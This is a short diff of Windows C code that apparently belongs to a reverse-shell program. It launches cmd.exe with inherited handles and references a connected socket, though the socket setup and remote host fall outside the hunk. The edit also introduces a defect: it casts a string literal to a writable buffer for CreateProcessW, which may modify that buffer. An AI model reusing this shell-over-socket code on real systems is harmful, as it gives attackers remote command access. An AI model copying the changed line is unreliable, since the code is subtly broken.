@@ -62,9 +62,9 @@ int _tmain(void*)
 	PROCESS_INFORMATION pi;
 	ZeroMemory(&pi, sizeof(pi));
 
-	LPWSTR cmd = _wcsdup(L"C:\\Windows\\System32\\cmd.exe");
+	 LPCWSTR cmd = L"C:\\Windows\\System32\\cmd.exe";
 
-	if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+	if (!CreateProcessW(NULL, (LPWSTR)cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
 	{
 		_tprintf(L"CreateProcess failed: %d\n", GetLastError());
 		closesocket(ConnectSocket);
